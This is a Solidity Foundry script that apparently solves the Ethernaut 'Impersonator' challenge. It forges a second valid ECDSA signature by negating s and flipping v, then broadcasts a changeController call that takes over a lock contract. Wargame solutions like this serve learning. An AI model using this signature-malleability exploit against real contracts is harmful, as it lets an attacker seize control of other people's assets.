// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
interface Ethernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
}

interface Locker {
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external; 
}

contract ImpersonatorScript is Script {
    function run() external {
        bytes memory _signature = hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B";
        address lockAddress = 0x1e35B0B2375566908D281a54d89bd9971e33dE75;
        uint256 lockedId = 1337;
        
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, lockedId) // 32 bytes
            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
        }
        address initialController = address(1);
        uint8 v;
        bytes32 r;
        bytes32 s;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32 bytes
            v := mload(add(_signature, 0x60))
            mstore(add(ptr, 32), v) // 32 byte v
            r := mload(add(_signature, 0x20))
            mstore(add(ptr, 64), r) // 32 bytes r
            s := mload(add(_signature, 0x40))
            mstore(add(ptr, 96), s) // 32 bytes s
            pop(
                staticcall(
                    gas(), // Amount of gas left for the transaction.
                    initialController, // Address of `ecrecover`.
                    ptr, // Start of input.
                    0x80, // Size of input.
                    0x00, // Start of output.
                    0x20 // Size of output.
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

        uint256 newS = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - uint256(s);

        vm.startBroadcast();
        Locker l = Locker(lockAddress);
        l.changeController(v ^ 7, r, bytes32(newS), address(0));
        // Ethernaut e = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
        // e.submitLevelInstance(payable(0x563F78dAACa297cFCecaF597a885d8a5dA1909F6));
        vm.stopBroadcast();
    }
}
